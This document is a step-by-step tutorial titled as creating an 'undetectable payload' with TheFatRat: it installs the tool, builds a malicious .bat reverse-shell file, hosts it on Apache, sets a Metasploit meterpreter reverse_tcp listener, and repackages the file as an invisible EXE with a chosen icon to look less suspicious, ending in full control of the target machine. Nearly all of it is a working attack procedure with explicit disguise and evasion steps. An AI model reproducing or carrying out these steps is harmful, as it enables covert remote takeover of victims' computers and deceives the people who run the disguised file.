CREATING AN UNDETECTABLE PAYLOAD USING FATRAT

- TheFatRat doesn't come installed on Kali Linux by default so,
you'd have to install it first.

- First, you'd have to clone the repo from GitHub.
1. Open the terminal and navigate to the directory you'd want
to download it at eg. '/home/kali/tools'
Then, enter the command below:
$ git clone https://github.com/Screetsec/TheFatRat.git

2. Change directory to 'TheFatRat' folder.
$ cd TheFatRat

3. Add execution permission to the 'setup.sh' file.
chmod +x setup.sh 

4. Run the installer 'setup.sh' file
$ ./setup.sh

- After installation, run the tool
$ fatrat

- A) Creating a malicious file
* Select option 6
* Select option 1 (creates a .bat file)
* Set LHOST IP:
 Type your local IP address (can be found by using the command, $ ifconfig)
* Set LPORT:
 8080

* Enter a name for your output file. eg. "setup"
* Select payload number 3

- After the file is generated, navigate to where the output file is.
Open another terminal window and type:
$ cd /home/kali/tools/TheFatRat/output

- You'd find the 'setup.bat' file there. Copy it to the default
root folder of the Apache web server.
$ cp setup.bat /var/www/html

- Set the listener
$ msfconsole

Then, enter the following commands.
msf5 > use exploit/multi/handler
msf5 > set payload windows/meterpreter/reverse_tcp
msf5 > set LHOST {your-local-IP address}
msf5 > set LPORT 8080

- To begin listening for connections
msf5 > run

--> Switch from Kali VM to Windows machine <--
- Open a web browser
- Enter the local IP address of your Kali machine
(in the search bar): {local-IP}
- You see the .bat file 'setup.bat'
- Save the file.

- MAKE THE FILE LOOK LESS SUSPICIOUS
* Use a program called "Advanced BAT to EXE converter"
* Download and install the program first.
* After installing the program;
* Go to "File" and select "Open" to select the 'setup.bat' file.
* Click "File" again and select "Build EXE"
* Check the "Start invisible" box.
* Go to "Select icon" to select any icon of your choice.
* Click "Build EXE".
* Type the file name and select the location to save the file.
* Click "Save"

- Run the file.
- This will launch a session in your Kali machine.

You now have full control over the target machine. Yayyyy!
